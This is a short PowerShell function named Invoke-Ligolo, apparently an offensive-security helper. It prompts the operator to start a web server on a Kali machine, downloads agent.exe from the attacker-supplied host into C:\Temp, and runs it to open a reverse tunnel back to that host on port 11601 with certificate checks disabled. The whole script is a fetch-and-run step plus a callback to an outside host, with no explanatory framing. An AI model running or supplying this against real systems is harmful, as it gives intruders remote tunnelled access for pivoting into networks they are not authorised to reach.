function Invoke-Ligolo(){ 

[cmdletbinding()] Param(
    
     [Parameter(Position = 0, Mandatory = $true)]
     [string]
     $LHOST,
     [Parameter(ParameterSetName="help")]
     [Switch]
     $help
)

mkdir C:\Temp
cd C:\Temp
Read-Host -Prompt "Start web server on port 80 on kali, where agent.exe resides"
wget -usebasicparsing http://$LHOST/agent.exe -o agent.exe
.\agent.exe -connect $LHOST':11601' -ignore-cert
}
